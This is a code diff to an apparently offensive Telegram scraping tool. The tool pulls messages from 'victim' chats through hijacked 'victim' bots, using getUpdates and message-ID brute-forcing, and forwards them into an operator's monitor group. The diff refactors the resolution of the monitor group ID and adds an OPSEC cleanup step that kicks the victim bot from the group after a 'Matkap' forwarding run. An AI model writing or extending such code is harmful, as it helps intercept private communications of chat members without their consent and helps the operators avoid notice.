@@ -16,32 +16,60 @@ logger = logging.getLogger("scraper")
 
 # Resolve MONITOR_GROUP_ID to both its username and numeric forms so comparisons
 # work regardless of which format is stored (e.g. "@theprawnhunter" vs -1003588166404).
-# Populated lazily on first scrape so startup doesn't block on a network call.
+# Populated once at module import via a thread (safe for sync callers) and cached.
 _MONITOR_GROUP_IDS: set[str] = set()
+_MONITOR_GROUP_IDS_RESOLVED = False
 
-def _get_monitor_group_ids() -> set[str]:
-    """Returns a set of string forms of the monitor group ID (username + numeric)."""
-    global _MONITOR_GROUP_IDS
-    if _MONITOR_GROUP_IDS:
+
+def _resolve_monitor_group_ids_sync() -> set[str]:
+    """Resolve MONITOR_GROUP_ID synchronously (safe to call from threads)."""
+    global _MONITOR_GROUP_IDS, _MONITOR_GROUP_IDS_RESOLVED
+    if _MONITOR_GROUP_IDS_RESOLVED:
         return _MONITOR_GROUP_IDS
     raw = str(settings.MONITOR_GROUP_ID).strip()
-    _MONITOR_GROUP_IDS.add(raw)
-    # If it's a username, resolve the numeric ID via Bot API
-    if raw.startswith("@") or not raw.lstrip("-").isdigit():
+    ids: set[str] = {raw}
+    # If it's a numeric ID already, also add the supergroup form with -100 prefix if needed
+    if raw.lstrip("-").isdigit():
+        # Some callers may pass just the bare ID without -100 prefix; store both forms
+        n = int(raw)
+        ids.add(str(n))
+        if n > 0:
+            ids.add(str(-n))  # Telegram supergroups may have both forms
+    else:
+        # Username form — resolve numeric via Bot API (sync httpx, runs in thread)
         try:
-            import httpx as _httpx
-            from app.core.config import settings as _s
-            token = str(_s.MONITOR_BOT_TOKEN).split(",")[0].strip()
-            r = _httpx.get(
+            token = str(settings.MONITOR_BOT_TOKEN).split(",")[0].strip()
+            r = httpx.get(
                 f"https://api.telegram.org/bot{token}/getChat",
                 params={"chat_id": raw}, timeout=10
             )
             numeric = r.json().get("result", {}).get("id")
             if numeric:
-                _MONITOR_GROUP_IDS.add(str(numeric))
+                ids.add(str(numeric))
         except Exception:
             pass
+    _MONITOR_GROUP_IDS = ids
+    _MONITOR_GROUP_IDS_RESOLVED = True
     return _MONITOR_GROUP_IDS
+
+
+async def _resolve_monitor_group_ids_async() -> set[str]:
+    """Async-safe wrapper — runs the sync resolver in a thread so it never blocks the loop."""
+    global _MONITOR_GROUP_IDS_RESOLVED
+    if _MONITOR_GROUP_IDS_RESOLVED:
+        return _MONITOR_GROUP_IDS
+    return await asyncio.to_thread(_resolve_monitor_group_ids_sync)
+
+
+def _get_monitor_group_ids() -> set[str]:
+    """Returns cached set of monitor group ID forms.
+
+    Sync callers (guards in scraper init): safe to call directly — the sync
+    resolver uses a blocking httpx.get but that is intentional (called once,
+    cached thereafter). In async contexts prefer _resolve_monitor_group_ids_async().
+    """
+    return _resolve_monitor_group_ids_sync()
+
 
 def _is_monitor_group(chat_id) -> bool:
     """True if chat_id (any form) refers to our monitor/hub group."""
@@ -77,8 +105,10 @@ class ScraperService:
         Strategy 2: ID Bruteforce (GetMessages) - Uses finding from Strategy 3 to scan backwards.
         Strategy 3: Bot API (getUpdates) - Fallback. Finds recent IDs (needed for Strat 2).
         """
-        # Guard: never scrape the monitor group itself as a victim chat
-        if _is_monitor_group(chat_id):
+        # Guard: never scrape the monitor group itself as a victim chat.
+        # Use async resolver so the first call doesn't block the event loop.
+        monitor_ids = await _resolve_monitor_group_ids_async()
+        if str(chat_id) in monitor_ids:
             logger.warning("⛔ [Scraper] Refusing to scrape monitor group as victim chat — skipping.")
             return []
 
@@ -221,6 +251,16 @@ class ScraperService:
                             scraped_messages.append(m)
                             unique_ids.add(m["telegram_msg_id"])
                     logger.info(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
+
+                    # CLEANUP: Remove the victim bot from the monitor group after forwarding.
+                    # Leaving it as a permanent member is an OPSEC risk — it can see all
+                    # group messages. Kick it immediately after scrape completes.
+                    try:
+                        if victim_username:
+                            await user_agent.kick_bot_from_group(victim_username, dest_chat_id)
+                            logger.info(f"    🧹 [Scraper] Kicked @{victim_username} from monitor group after Matkap.")
+                    except Exception as e_kick:
+                        logger.warning(f"    ⚠️ [Scraper] Post-Matkap kick failed (non-fatal): {e_kick}")
             except Exception as e:
                 logger.error(f"❌ [Scraper] Forwarding failed: {e}")
 
